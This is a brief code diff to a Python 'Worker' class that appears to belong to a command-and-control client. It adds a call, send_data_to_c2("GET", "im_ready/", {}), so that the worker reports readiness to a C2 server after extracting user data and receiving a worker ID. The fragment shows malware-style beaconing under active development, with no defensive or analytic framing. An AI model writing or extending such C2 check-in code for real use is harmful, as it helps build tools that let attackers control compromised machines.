@@ -57,6 +57,7 @@ class Worker:
             remove_directory(user_data_file)
             self.id = response.get("worker_id")
             self.user_data_path = "user_data_extracted"
+            response = send_data_to_c2("GET", "im_ready/", {})
             logging.info("end initialize")
 
 
